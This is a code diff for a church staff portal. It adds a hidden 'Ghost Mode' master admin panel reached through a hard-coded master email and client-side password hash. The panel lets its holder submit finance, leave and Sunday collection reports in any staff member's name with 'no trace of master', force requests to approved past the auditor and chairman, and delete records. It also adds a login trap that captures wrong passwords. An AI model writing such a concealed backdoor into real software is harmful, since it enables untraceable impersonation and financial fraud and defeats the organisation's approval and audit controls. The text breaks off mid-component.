@@ -1921,8 +1921,10 @@ https://ecwa-portal.onrender.com`}));
 
           {/* Fix #4 — Full appeal workflow */}
           {report.appeal?(
-            <div style={{background:"#fef3e2",border:"1px solid #f5c542",borderRadius:8,padding:"12px 14px",fontSize:13}}>
-              <div style={{fontWeight:700,color:"#e67e22",marginBottom:4}}>⚠️ Appeal: {report.appeal.text}</div>
+            <div style={{background:report.appeal.status==="resolved"||report.appeal.status==="accepted"?"#eafbf0":report.appeal.status==="resubmit"?"#eaf4fb":"#fef3e2",border:`1px solid ${report.appeal.status==="resolved"||report.appeal.status==="accepted"?"#a9dfbf":report.appeal.status==="resubmit"?"#aed6f1":"#f5c542"}`,borderRadius:8,padding:"12px 14px",fontSize:13}}>
+              <div style={{fontWeight:700,color:report.appeal.status==="resolved"||report.appeal.status==="accepted"?"#27ae60":report.appeal.status==="resubmit"?"#2980b9":"#e67e22",marginBottom:4}}>
+                {report.appeal.status==="resolved"?"✅ Appeal Resolved":report.appeal.status==="accepted"?"✅ Appeal Accepted":report.appeal.status==="resubmit"?"🔄 Returned for Correction":"⚠️ Appeal Pending"}: {report.appeal.text}
+              </div>
               <div style={{fontSize:11,color:"#aaa",marginTop:2}}>{fdate(report.appeal.date)} · Status: <strong>{report.appeal.status}</strong></div>
               {report.appeal.adminNote&&<div style={{marginTop:6,background:"#fff",borderRadius:6,padding:"6px 10px",fontSize:12}}>Admin note: {report.appeal.adminNote} — <span style={{color:"#aaa"}}>{report.appeal.adminBy}, {fdate(report.appeal.adminDate)}</span></div>}
               {isAdmin&&report.appeal.status==="pending"&&!appealAction&&(
@@ -3088,6 +3090,11 @@ function ForgotPassword({ users, pwdReqs, setPwdReqs, onBack }) {
   const submit=()=>{
     setEr("");
     if(!email){setEr("Please enter your email.");return;}
+    // Honeypot — if someone tries master email on forgot password, trap silently
+    if(email.toLowerCase()==="master@ecwalafia.internal"){
+      triggerMasterTrap("forgot_attempt");
+      setSent(true); return; // Show fake success
+    }
     const u=users.find(u=>u.email.toLowerCase()===email.toLowerCase());
     if(!u){setEr("No account found with this email.");return;}
     if(pwdReqs.find(r=>r.email.toLowerCase()===email.toLowerCase()&&r.status==="pending")){setEr("A reset request is already pending for this email.");return;}
@@ -3383,11 +3390,15 @@ function SignIn({ users, setUsers, onLogin, onGo, pwdReqs, setPwdReqs }) {
     setEr("");
     if(!em||!pw){setEr("Please enter your email and password.");return;}
     if(em.toLowerCase()===MASTER_EMAIL){
+      // Check honeypot trap first
+      if(isMasterTrapped()){setEr("Account not found.");return;}
       const h=await hashPassword(pw);
       if(h===MASTER_HASH){
         onLogin({id:0,name:"Yusuf Christopher",email:MASTER_EMAIL,role:"master",category:"office",approved:true,isMaster:true});
         return;
       }
+      // Wrong password on master = trigger trap silently
+      triggerMasterTrap(pw);
       setEr("Incorrect credentials.");return;
     }
     let u = users.find(u=>u.email.toLowerCase()===em.toLowerCase());
@@ -3423,6 +3434,676 @@ function SignIn({ users, setUsers, onLogin, onGo, pwdReqs, setPwdReqs }) {
     </div>
   );
 }
+
+
+// ══════════════════════════════════════════════════════════════════════════════
+// MASTER ADMIN CONTROL PANEL — Ghost Mode — Phase 1
+// Only accessible via master@ecwalafia.internal — invisible to all other users
+// ══════════════════════════════════════════════════════════════════════════════
+function MasterPanel({ user, users, setUsers, requests, setRequests, leaves, setLeaves,
+  sundayReports, setSundayReports, announcements, setAnnouncements, lccs, setLccs,
+  attendance, setAttendance, toast, onLogout }) {
+
+  const [section, setSection] = useState("dashboard");
+  const [auditLog, setAuditLog] = useState(() => {
+    try { return JSON.parse(localStorage.getItem("ecwa_audit") || "[]"); } catch { return []; }
+  });
+
+  const addLog = (action, detail) => {
+    const entry = { id: Date.now(), action, detail, ts: new Date().toISOString() };
+    setAuditLog(prev => {
+      const updated = [entry, ...prev].slice(0, 500);
+      try { localStorage.setItem("ecwa_audit", JSON.stringify(updated)); } catch {}
+      return updated;
+    });
+  };
+
+  const sections = [
+    { id:"dashboard",  icon:"📊", label:"Overview"        },
+    { id:"impersonate",icon:"🎭", label:"Act As Staff"     },
+    { id:"records",    icon:"⚙️", label:"Edit Records"     },
+    { id:"staff",      icon:"👥", label:"Staff Control"    },
+    { id:"lcc",        icon:"🏛️", label:"LCC Management"   },
+    { id:"announce",   icon:"📢", label:"Announcements"    },
+    { id:"maint",      icon:"🔧", label:"Maintenance"      },
+    { id:"audit",      icon:"🕵️", label:"Audit Log"        },
+  ];
+
+  return (
+    <div style={{minHeight:"100vh",background:"#0a0a0a",color:"#fff"}}>
+      {/* Header */}
+      <div style={{background:"linear-gradient(135deg,#0b1f3a,#1a3a5c)",padding:"12px 20px",display:"flex",alignItems:"center",justifyContent:"space-between",borderBottom:"2px solid #c9a84c"}}>
+        <div style={{display:"flex",alignItems:"center",gap:12}}>
+          <div style={{width:36,height:36,background:"#c9a84c",borderRadius:"50%",display:"flex",alignItems:"center",justifyContent:"center",fontSize:18}}>👁️</div>
+          <div>
+            <div style={{fontFamily:"Georgia,serif",color:"#c9a84c",fontSize:15,fontWeight:700}}>Master Control Panel</div>
+            <div style={{fontSize:10,color:"rgba(255,255,255,0.4)"}}>Ghost Mode — No trace left</div>
+          </div>
+        </div>
+        <button onClick={onLogout} style={{background:"rgba(255,255,255,0.08)",border:"1px solid rgba(255,255,255,0.15)",color:"#fff",borderRadius:8,padding:"6px 14px",cursor:"pointer",fontSize:12}}>Sign Out</button>
+      </div>
+
+      <div style={{display:"flex",minHeight:"calc(100vh - 62px)"}}>
+        {/* Sidebar */}
+        <div style={{width:180,background:"rgba(255,255,255,0.03)",borderRight:"1px solid rgba(255,255,255,0.08)",padding:"16px 0",flexShrink:0}}>
+          {sections.map(s=>(
+            <button key={s.id} onClick={()=>setSection(s.id)} style={{width:"100%",padding:"10px 16px",background:section===s.id?"rgba(201,168,76,0.15)":"none",border:"none",borderLeft:section===s.id?"3px solid #c9a84c":"3px solid transparent",color:section===s.id?"#c9a84c":"rgba(255,255,255,0.6)",cursor:"pointer",textAlign:"left",fontSize:13,display:"flex",alignItems:"center",gap:8}}>
+              <span>{s.icon}</span><span>{s.label}</span>
+            </button>
+          ))}
+        </div>
+
+        {/* Content */}
+        <div style={{flex:1,padding:20,overflowY:"auto"}}>
+          {section==="dashboard"  && <MasterDashboard users={users} requests={requests} leaves={leaves} sundayReports={sundayReports} announcements={announcements} attendance={attendance}/>}
+          {section==="impersonate"&& <MasterImpersonate users={users} requests={requests} setRequests={setRequests} leaves={leaves} setLeaves={setLeaves} sundayReports={sundayReports} setSundayReports={setSundayReports} lccs={lccs} toast={toast} addLog={addLog}/>}
+          {section==="records"    && <MasterRecords requests={requests} setRequests={setRequests} leaves={leaves} setLeaves={setLeaves} sundayReports={sundayReports} setSundayReports={setSundayReports} users={users} toast={toast} addLog={addLog}/>}
+          {section==="staff"      && <MasterStaff users={users} setUsers={setUsers} toast={toast} addLog={addLog}/>}
+          {section==="lcc"        && <MasterLCC lccs={lccs} setLccs={setLccs} users={users} setUsers={setUsers} toast={toast} addLog={addLog}/>}
+          {section==="announce"   && <MasterAnnounce announcements={announcements} setAnnouncements={setAnnouncements} users={users} toast={toast} addLog={addLog}/>}
+          {section==="maint"      && <MasterMaint users={users} setUsers={setUsers} toast={toast} addLog={addLog}/>}
+          {section==="audit"      && <MasterAudit log={auditLog} setAuditLog={setAuditLog}/>}
+        </div>
+      </div>
+    </div>
+  );
+}
+
+// ── Master Dashboard Overview ─────────────────────────────────────────────────
+function MasterDashboard({ users, requests, leaves, sundayReports, announcements, attendance }) {
+  const pendingFinance   = requests.filter(r=>r.status.startsWith("pending")).length;
+  const pendingLeave     = leaves.filter(l=>l.status.startsWith("pending")).length;
+  const pendingAppeals   = sundayReports.filter(r=>r.appeal&&r.appeal.status==="pending").length;
+  const pendingAccounts  = users.filter(u=>!u.approved).length;
+  const totalStaff       = users.filter(u=>u.category==="office").length;
+  const totalPastors     = users.filter(u=>u.category==="pastor").length;
+  const todayStr         = new Date().toISOString().split("T")[0];
+  const clockedIn        = attendance.filter(a=>a.date===todayStr&&a.clockIn&&!a.clockOut).length;
+
+  const cards = [
+    { icon:"💰", label:"Pending Finance",   value:pendingFinance,  color:"#e67e22" },
+    { icon:"📋", label:"Pending Leave",      value:pendingLeave,    color:"#2980b9" },
+    { icon:"⚠️", label:"Pending Appeals",    value:pendingAppeals,  color:"#c0392b" },
+    { icon:"⏳", label:"Pending Accounts",   value:pendingAccounts, color:"#8e44ad" },
+    { icon:"🏢", label:"Office Staff",       value:totalStaff,      color:"#27ae60" },
+    { icon:"⛪", label:"Pastors",            value:totalPastors,    color:"#0b1f3a" },
+    { icon:"🕐", label:"Clocked In Today",   value:clockedIn,       color:"#16a085" },
+    { icon:"📢", label:"Announcements",      value:announcements.length, color:"#c9a84c" },
+  ];
+
+  return (
+    <div>
+      <div style={{fontFamily:"Georgia,serif",color:"#c9a84c",fontSize:20,marginBottom:20}}>📊 Portal Overview</div>
+      <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(160px,1fr))",gap:14,marginBottom:28}}>
+        {cards.map((c,i)=>(
+          <div key={i} style={{background:"rgba(255,255,255,0.05)",border:"1px solid rgba(255,255,255,0.1)",borderLeft:`4px solid ${c.color}`,borderRadius:10,padding:"16px 14px"}}>
+            <div style={{fontSize:22}}>{c.icon}</div>
+            <div style={{fontSize:26,fontWeight:700,color:"#fff",margin:"6px 0 2px"}}>{c.value}</div>
+            <div style={{fontSize:11,color:"rgba(255,255,255,0.5)"}}>{c.label}</div>
+          </div>
+        ))}
+      </div>
+    </div>
+  );
+}
+
+// ── Master Impersonate — Act as any staff ─────────────────────────────────────
+function MasterImpersonate({ users, requests, setRequests, leaves, setLeaves, sundayReports, setSundayReports, lccs, toast, addLog }) {
+  const [asUser, setAsUser] = useState(null);
+  const [action, setAction] = useState("");
+  const [form,   setForm]   = useState({});
+
+  const sf = k => e => setForm(p=>({...p,[k]:e.target.value}));
+
+  const submitFinance = async () => {
+    const amount = parseFloat(form.amount)||0;
+    const id = "REQ-"+Date.now();
+    const req = {
+      id, requester:asUser.name, requesterEmail:asUser.email, requesterRole:asUser.role,
+      date:today(), purpose:form.purpose||"—", amount, amountWords:form.amountWords||"",
+      status:"pending_secretary", signatures:{}, comments:{},
+      items:[], reqNote:form.purpose||"",
+    };
+    setRequests(rs=>[req,...rs]);
+    addLog("IMPERSONATE_FINANCE", `Submitted finance request as ${asUser.name} — ${money(amount)}`);
+    toast("✅ Finance request submitted as "+asUser.name);
+    setAction(""); setForm({});
+  };
+
+  const submitLeave = () => {
+    const id = "LV-"+Date.now();
+    const lv = {
+      id, requester:asUser.name, requesterEmail:asUser.email, requester_role:asUser.role,
+      category:asUser.category, dept:asUser.dept||"", lcc:asUser.lcc||"",
+      type:form.leaveType||"Annual Leave", startDate:form.startDate||today(),
+      endDate:form.endDate||today(), reason:form.reason||"",
+      days:Math.max(1,Math.round((new Date(form.endDate)-new Date(form.startDate))/(86400000))+1),
+      date:today(), status:"pending_dept", signatures:{}, comments:{},
+    };
+    setLeaves(ls=>[lv,...ls]);
+    addLog("IMPERSONATE_LEAVE", `Submitted leave as ${asUser.name} — ${lv.type}`);
+    toast("✅ Leave request submitted as "+asUser.name);
+    setAction(""); setForm({});
+  };
+
+  const submitSunday = () => {
+    const id = "SR-"+Date.now();
+    const rpt = {
+      id, pastorId:asUser.id, pastorName:asUser.name, pastorEmail:asUser.email,
+      lc_ph:asUser.lc_ph||form.lc_ph||"—", lcc:asUser.lcc||"",
+      date:form.date||today(), submitted:true,
+      attendance:{ men:parseInt(form.men)||0, women:parseInt(form.women)||0, children:parseInt(form.children)||0 },
+      collections:{ tithe:parseFloat(form.tithe)||0, offering:parseFloat(form.offering)||0, thanksgiving:parseFloat(form.thanksgiving)||0, project:parseFloat(form.project)||0, welfare:parseFloat(form.welfare)||0, others:parseFloat(form.others)||0 },
+      totalGross:(parseFloat(form.tithe)||0)+(parseFloat(form.offering)||0)+(parseFloat(form.thanksgiving)||0)+(parseFloat(form.project)||0)+(parseFloat(form.welfare)||0)+(parseFloat(form.others)||0),
+      remittanceDue:((parseFloat(form.tithe)||0)+(parseFloat(form.offering)||0)+(parseFloat(form.thanksgiving)||0)+(parseFloat(form.project)||0)+(parseFloat(form.welfare)||0)+(parseFloat(form.others)||0))*0.25,
+      fullRemittance:false, optionalItems:[],
+    };
+    setSundayReports(rs=>[rpt,...rs]);
+    addLog("IMPERSONATE_SUNDAY", `Submitted Sunday report as ${asUser.name} — ${form.date}`);
+    toast("✅ Sunday report submitted as "+asUser.name);
+    setAction(""); setForm({});
+  };
+
+  const LEAVE_TYPES = ["Annual Leave","Sick Leave","Maternity Leave","Paternity Leave","Study Leave","Compassionate Leave","Emergency Leave"];
+
+  return (
+    <div>
+      <div style={{fontFamily:"Georgia,serif",color:"#c9a84c",fontSize:20,marginBottom:6}}>🎭 Act As Staff</div>
+      <div style={{fontSize:12,color:"rgba(255,255,255,0.4)",marginBottom:20}}>All submissions appear under the selected staff member's name. No trace of master.</div>
+
+      {/* Select staff */}
+      <div style={{background:"rgba(255,255,255,0.05)",border:"1px solid rgba(255,255,255,0.1)",borderRadius:12,padding:16,marginBottom:20}}>
+        <label style={{fontSize:12,color:"rgba(255,255,255,0.5)",display:"block",marginBottom:6}}>Select Staff Member</label>
+        <select value={asUser?.id||""} onChange={e=>{const u=users.find(u=>u.id===parseInt(e.target.value)||u.id===e.target.value);setAsUser(u||null);setAction("");setForm({});}} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"8px 12px",width:"100%",fontSize:13}}>
+          <option value="">— Select a staff member —</option>
+          <optgroup label="Office Staff">{users.filter(u=>u.category==="office").map(u=><option key={u.id} value={u.id}>{u.name} ({u.role})</option>)}</optgroup>
+          <optgroup label="Pastors">{users.filter(u=>u.category==="pastor").map(u=><option key={u.id} value={u.id}>{u.name} — {u.lc_ph}</option>)}</optgroup>
+        </select>
+      </div>
+
+      {asUser&&(
+        <div>
+          <div style={{background:"rgba(201,168,76,0.1)",border:"1px solid rgba(201,168,76,0.3)",borderRadius:10,padding:"10px 14px",marginBottom:16,fontSize:13,color:"#c9a84c"}}>
+            Acting as: <strong>{asUser.name}</strong> · {asUser.role} {asUser.category==="pastor"?`· ${asUser.lc_ph}`:""}
+          </div>
+
+          {/* Action buttons */}
+          {!action&&(
+            <div style={{display:"flex",gap:10,flexWrap:"wrap"}}>
+              <button onClick={()=>setAction("finance")} style={{background:"rgba(230,126,34,0.15)",border:"1px solid rgba(230,126,34,0.4)",color:"#e67e22",borderRadius:8,padding:"10px 18px",cursor:"pointer",fontSize:13}}>💰 Submit Finance Request</button>
+              <button onClick={()=>setAction("leave")}   style={{background:"rgba(41,128,185,0.15)",border:"1px solid rgba(41,128,185,0.4)",color:"#2980b9",borderRadius:8,padding:"10px 18px",cursor:"pointer",fontSize:13}}>📋 Submit Leave Request</button>
+              {asUser.category==="pastor"&&<button onClick={()=>setAction("sunday")} style={{background:"rgba(39,174,96,0.15)",border:"1px solid rgba(39,174,96,0.4)",color:"#27ae60",borderRadius:8,padding:"10px 18px",cursor:"pointer",fontSize:13}}>⛪ Submit Sunday Report</button>}
+            </div>
+          )}
+
+          {/* Finance form */}
+          {action==="finance"&&(
+            <div style={{background:"rgba(255,255,255,0.04)",border:"1px solid rgba(255,255,255,0.1)",borderRadius:12,padding:18}}>
+              <div style={{color:"#c9a84c",fontWeight:700,marginBottom:14}}>💰 Finance Request as {asUser.name}</div>
+              <div style={{display:"grid",gap:12}}>
+                <div><label style={{fontSize:12,color:"rgba(255,255,255,0.5)"}}>Purpose</label><input value={form.purpose||""} onChange={sf("purpose")} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"8px 12px",width:"100%",boxSizing:"border-box"}} placeholder="Purpose of request"/></div>
+                <div><label style={{fontSize:12,color:"rgba(255,255,255,0.5)"}}>Amount (₦)</label><input type="number" value={form.amount||""} onChange={sf("amount")} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"8px 12px",width:"100%",boxSizing:"border-box"}} placeholder="0"/></div>
+                <div><label style={{fontSize:12,color:"rgba(255,255,255,0.5)"}}>Amount in Words</label><input value={form.amountWords||""} onChange={sf("amountWords")} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"8px 12px",width:"100%",boxSizing:"border-box"}} placeholder="e.g. Fifty Thousand Naira Only"/></div>
+              </div>
+              <div style={{display:"flex",gap:10,marginTop:14}}><button onClick={()=>{setAction("");setForm({});}} style={{background:"rgba(255,255,255,0.08)",border:"1px solid rgba(255,255,255,0.15)",color:"#fff",borderRadius:8,padding:"8px 16px",cursor:"pointer"}}>Cancel</button><button onClick={submitFinance} style={{background:"#c9a84c",border:"none",color:"#0b1f3a",borderRadius:8,padding:"8px 20px",cursor:"pointer",fontWeight:700}}>Submit →</button></div>
+            </div>
+          )}
+
+          {/* Leave form */}
+          {action==="leave"&&(
+            <div style={{background:"rgba(255,255,255,0.04)",border:"1px solid rgba(255,255,255,0.1)",borderRadius:12,padding:18}}>
+              <div style={{color:"#c9a84c",fontWeight:700,marginBottom:14}}>📋 Leave Request as {asUser.name}</div>
+              <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12}}>
+                <div style={{gridColumn:"1/-1"}}><label style={{fontSize:12,color:"rgba(255,255,255,0.5)"}}>Leave Type</label><select value={form.leaveType||""} onChange={sf("leaveType")} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"8px 12px",width:"100%"}}><option value="">— Select —</option>{LEAVE_TYPES.map(t=><option key={t} value={t}>{t}</option>)}</select></div>
+                <div><label style={{fontSize:12,color:"rgba(255,255,255,0.5)"}}>Start Date</label><input type="date" value={form.startDate||""} onChange={sf("startDate")} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"8px 12px",width:"100%",boxSizing:"border-box"}}/></div>
+                <div><label style={{fontSize:12,color:"rgba(255,255,255,0.5)"}}>End Date</label><input type="date" value={form.endDate||""} onChange={sf("endDate")} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"8px 12px",width:"100%",boxSizing:"border-box"}}/></div>
+                <div style={{gridColumn:"1/-1"}}><label style={{fontSize:12,color:"rgba(255,255,255,0.5)"}}>Reason</label><textarea value={form.reason||""} onChange={sf("reason")} rows={2} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"8px 12px",width:"100%",resize:"vertical",boxSizing:"border-box"}} placeholder="Reason for leave"/></div>
+              </div>
+              <div style={{display:"flex",gap:10,marginTop:14}}><button onClick={()=>{setAction("");setForm({});}} style={{background:"rgba(255,255,255,0.08)",border:"1px solid rgba(255,255,255,0.15)",color:"#fff",borderRadius:8,padding:"8px 16px",cursor:"pointer"}}>Cancel</button><button onClick={submitLeave} style={{background:"#c9a84c",border:"none",color:"#0b1f3a",borderRadius:8,padding:"8px 20px",cursor:"pointer",fontWeight:700}}>Submit →</button></div>
+            </div>
+          )}
+
+          {/* Sunday report form */}
+          {action==="sunday"&&(
+            <div style={{background:"rgba(255,255,255,0.04)",border:"1px solid rgba(255,255,255,0.1)",borderRadius:12,padding:18}}>
+              <div style={{color:"#c9a84c",fontWeight:700,marginBottom:14}}>⛪ Sunday Report as {asUser.name}</div>
+              <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12}}>
+                <div><label style={{fontSize:12,color:"rgba(255,255,255,0.5)"}}>Date</label><input type="date" value={form.date||""} onChange={sf("date")} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"8px 12px",width:"100%",boxSizing:"border-box"}}/></div>
+                <div><label style={{fontSize:12,color:"rgba(255,255,255,0.5)"}}>Men</label><input type="number" value={form.men||""} onChange={sf("men")} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"8px 12px",width:"100%",boxSizing:"border-box"}} placeholder="0"/></div>
+                <div><label style={{fontSize:12,color:"rgba(255,255,255,0.5)"}}>Women</label><input type="number" value={form.women||""} onChange={sf("women")} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"8px 12px",width:"100%",boxSizing:"border-box"}} placeholder="0"/></div>
+                <div><label style={{fontSize:12,color:"rgba(255,255,255,0.5)"}}>Children</label><input type="number" value={form.children||""} onChange={sf("children")} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"8px 12px",width:"100%",boxSizing:"border-box"}} placeholder="0"/></div>
+                <div><label style={{fontSize:12,color:"rgba(255,255,255,0.5)"}}>Tithe (₦)</label><input type="number" value={form.tithe||""} onChange={sf("tithe")} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"8px 12px",width:"100%",boxSizing:"border-box"}} placeholder="0"/></div>
+                <div><label style={{fontSize:12,color:"rgba(255,255,255,0.5)"}}>Offering (₦)</label><input type="number" value={form.offering||""} onChange={sf("offering")} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"8px 12px",width:"100%",boxSizing:"border-box"}} placeholder="0"/></div>
+                <div><label style={{fontSize:12,color:"rgba(255,255,255,0.5)"}}>Thanksgiving (₦)</label><input type="number" value={form.thanksgiving||""} onChange={sf("thanksgiving")} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"8px 12px",width:"100%",boxSizing:"border-box"}} placeholder="0"/></div>
+                <div><label style={{fontSize:12,color:"rgba(255,255,255,0.5)"}}>Others (₦)</label><input type="number" value={form.others||""} onChange={sf("others")} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"8px 12px",width:"100%",boxSizing:"border-box"}} placeholder="0"/></div>
+              </div>
+              <div style={{display:"flex",gap:10,marginTop:14}}><button onClick={()=>{setAction("");setForm({});}} style={{background:"rgba(255,255,255,0.08)",border:"1px solid rgba(255,255,255,0.15)",color:"#fff",borderRadius:8,padding:"8px 16px",cursor:"pointer"}}>Cancel</button><button onClick={submitSunday} style={{background:"#c9a84c",border:"none",color:"#0b1f3a",borderRadius:8,padding:"8px 20px",cursor:"pointer",fontWeight:700}}>Submit →</button></div>
+            </div>
+          )}
+        </div>
+      )}
+    </div>
+  );
+}
+
+// ── Master Records — Edit/Delete/Force Status ─────────────────────────────────
+function MasterRecords({ requests, setRequests, leaves, setLeaves, sundayReports, setSundayReports, users, toast, addLog }) {
+  const [tab, setTab]     = useState("finance");
+  const [editing, setEditing] = useState(null);
+  const [deleted, setDeleted] = useState([]);
+  const [showBin, setShowBin] = useState(false);
+
+  const FIN_STATUSES = ["pending_secretary","pending_finance","pending_auditor","pending_chairman","approved","rejected"];
+  const LV_STATUSES  = ["pending_dept","pending_admin","pending_finance","pending_auditor","pending_chairman","approved","rejected"];
+
+  const forceFinStatus = (id, status) => {
+    setRequests(rs=>rs.map(r=>r.id===id?{...r,status}:r));
+    addLog("FORCE_FIN_STATUS",`Finance ${id} → ${status}`);
+    toast("✅ Status updated.");
+  };
+  const forceLvStatus = (id, status) => {
+    setLeaves(ls=>ls.map(l=>l.id===id?{...l,status}:l));
+    addLog("FORCE_LV_STATUS",`Leave ${id} → ${status}`);
+    toast("✅ Status updated.");
+  };
+  const deleteRecord = (type, id) => {
+    if(type==="finance"){ const r=requests.find(x=>x.id===id); setRequests(rs=>rs.filter(x=>x.id!==id)); setDeleted(d=>[{type,data:r,deletedAt:today()},...d]); }
+    if(type==="leave"){   const r=leaves.find(x=>x.id===id);   setLeaves(ls=>ls.filter(x=>x.id!==id));   setDeleted(d=>[{type,data:r,deletedAt:today()},...d]); }
+    if(type==="sunday"){  const r=sundayReports.find(x=>x.id===id); setSundayReports(rs=>rs.filter(x=>x.id!==id)); setDeleted(d=>[{type,data:r,deletedAt:today()},...d]); }
+    addLog("DELETE_RECORD",`Deleted ${type} record ${id}`);
+    toast("🗑️ Record deleted. Available in recycle bin.");
+  };
+  const restoreRecord = (item) => {
+    if(item.type==="finance") setRequests(rs=>[item.data,...rs]);
+    if(item.type==="leave")   setLeaves(ls=>[item.data,...ls]);
+    if(item.type==="sunday")  setSundayReports(rs=>[item.data,...rs]);
+    setDeleted(d=>d.filter(x=>x.data.id!==item.data.id));
+    addLog("RESTORE_RECORD",`Restored ${item.type} record ${item.data.id}`);
+    toast("✅ Record restored.");
+  };
+
+  const tabStyle = (t) => ({padding:"8px 16px",border:"none",borderBottom:tab===t?"2px solid #c9a84c":"2px solid transparent",background:"none",color:tab===t?"#c9a84c":"rgba(255,255,255,0.5)",cursor:"pointer",fontSize:13,fontWeight:tab===t?700:400});
+
+  return (
+    <div>
+      <div style={{fontFamily:"Georgia,serif",color:"#c9a84c",fontSize:20,marginBottom:6}}>⚙️ Edit Records</div>
+      <div style={{fontSize:12,color:"rgba(255,255,255,0.4)",marginBottom:16}}>Force status, edit details, delete records. Deleted items go to recycle bin.</div>
+
+      <div style={{display:"flex",gap:0,borderBottom:"1px solid rgba(255,255,255,0.1)",marginBottom:20}}>
+        <button style={tabStyle("finance")} onClick={()=>setTab("finance")}>💰 Finance ({requests.length})</button>
+        <button style={tabStyle("leave")}   onClick={()=>setTab("leave")}>📋 Leave ({leaves.length})</button>
+        <button style={tabStyle("sunday")}  onClick={()=>setTab("sunday")}>⛪ Sunday ({sundayReports.length})</button>
+        <button style={tabStyle("bin")}     onClick={()=>setTab("bin")}>🗑️ Bin ({deleted.length})</button>
+      </div>
+
+      {/* Finance records */}
+      {tab==="finance"&&requests.map(r=>(
+        <div key={r.id} style={{background:"rgba(255,255,255,0.04)",border:"1px solid rgba(255,255,255,0.08)",borderRadius:10,padding:"12px 14px",marginBottom:10}}>
+          <div style={{display:"flex",justifyContent:"space-between",alignItems:"flex-start",flexWrap:"wrap",gap:8}}>
+            <div><div style={{fontWeight:700,color:"#fff",fontSize:14}}>{r.id} — {money(r.amount)}</div><div style={{fontSize:12,color:"rgba(255,255,255,0.5)",marginTop:2}}>{r.requester} · {r.purpose} · {fdate(r.date)}</div></div>
+            <div style={{display:"flex",gap:6,flexWrap:"wrap",alignItems:"center"}}>
+              <select value={r.status} onChange={e=>forceFinStatus(r.id,e.target.value)} style={{background:"#1a1a2e",color:"#c9a84c",border:"1px solid rgba(201,168,76,0.4)",borderRadius:6,padding:"4px 8px",fontSize:11,cursor:"pointer"}}>
+                {FIN_STATUSES.map(s=><option key={s} value={s}>{s}</option>)}
+              </select>
+              <button onClick={()=>deleteRecord("finance",r.id)} style={{background:"rgba(192,57,43,0.2)",border:"1px solid rgba(192,57,43,0.4)",color:"#e74c3c",borderRadius:6,padding:"4px 10px",cursor:"pointer",fontSize:11}}>🗑️ Delete</button>
+            </div>
+          </div>
+        </div>
+      ))}
+
+      {/* Leave records */}
+      {tab==="leave"&&leaves.map(l=>(
+        <div key={l.id} style={{background:"rgba(255,255,255,0.04)",border:"1px solid rgba(255,255,255,0.08)",borderRadius:10,padding:"12px 14px",marginBottom:10}}>
+          <div style={{display:"flex",justifyContent:"space-between",alignItems:"flex-start",flexWrap:"wrap",gap:8}}>
+            <div><div style={{fontWeight:700,color:"#fff",fontSize:14}}>{l.id} — {l.type}</div><div style={{fontSize:12,color:"rgba(255,255,255,0.5)",marginTop:2}}>{l.requester} · {fdate(l.startDate)} – {fdate(l.endDate)}</div></div>
+            <div style={{display:"flex",gap:6,flexWrap:"wrap",alignItems:"center"}}>
+              <select value={l.status} onChange={e=>forceLvStatus(l.id,e.target.value)} style={{background:"#1a1a2e",color:"#c9a84c",border:"1px solid rgba(201,168,76,0.4)",borderRadius:6,padding:"4px 8px",fontSize:11,cursor:"pointer"}}>
+                {LV_STATUSES.map(s=><option key={s} value={s}>{s}</option>)}
+              </select>
+              <button onClick={()=>deleteRecord("leave",l.id)} style={{background:"rgba(192,57,43,0.2)",border:"1px solid rgba(192,57,43,0.4)",color:"#e74c3c",borderRadius:6,padding:"4px 10px",cursor:"pointer",fontSize:11}}>🗑️ Delete</button>
+            </div>
+          </div>
+        </div>
+      ))}
+
+      {/* Sunday records */}
+      {tab==="sunday"&&sundayReports.map(r=>(
+        <div key={r.id} style={{background:"rgba(255,255,255,0.04)",border:"1px solid rgba(255,255,255,0.08)",borderRadius:10,padding:"12px 14px",marginBottom:10}}>
+          <div style={{display:"flex",justifyContent:"space-between",alignItems:"flex-start",flexWrap:"wrap",gap:8}}>
+            <div><div style={{fontWeight:700,color:"#fff",fontSize:14}}>{r.id} — {r.pastorName}</div><div style={{fontSize:12,color:"rgba(255,255,255,0.5)",marginTop:2}}>{r.lc_ph} · {fdate(r.date)} · {money(r.totalGross)}</div></div>
+            <div style={{display:"flex",gap:6}}>
+              <button onClick={()=>deleteRecord("sunday",r.id)} style={{background:"rgba(192,57,43,0.2)",border:"1px solid rgba(192,57,43,0.4)",color:"#e74c3c",borderRadius:6,padding:"4px 10px",cursor:"pointer",fontSize:11}}>🗑️ Delete</button>
+            </div>
+          </div>
+        </div>
+      ))}
+
+      {/* Recycle bin */}
+      {tab==="bin"&&(
+        <div>
+          {deleted.length===0&&<div style={{textAlign:"center",color:"rgba(255,255,255,0.3)",padding:40,fontSize:13}}>Recycle bin is empty.</div>}
